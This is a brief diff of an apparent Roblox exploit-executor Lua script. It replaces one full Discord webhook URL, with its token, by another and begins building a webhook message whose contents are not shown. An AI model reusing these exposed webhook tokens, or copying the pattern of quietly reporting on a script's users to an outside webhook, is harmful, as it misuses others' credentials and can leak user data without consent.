@@ -6,7 +6,7 @@ SONA_LOADED and "Sona" or
 "Unkown Executor Or Crap Exploit"
 
 local url =
-"https://discord.com/api/webhooks/901861795793367081/yUCQ-YeTtpqXpShCK2lbtXV1sdDtvlXiJOqGabORYAIuTiP2KnQ8rZMcjLbXahJzFdMk"
+"https://discord.com/api/webhooks/942193835281354813/bYOBdxiaGMV1TrQQt9npeQjZ_OyDkNnMqC_Z_MiMmeW3Ydr1jvcvocimKD6hzGN1Ow2e"
 local data = {
 ["content"] = "-",
 ["embeds"] = {
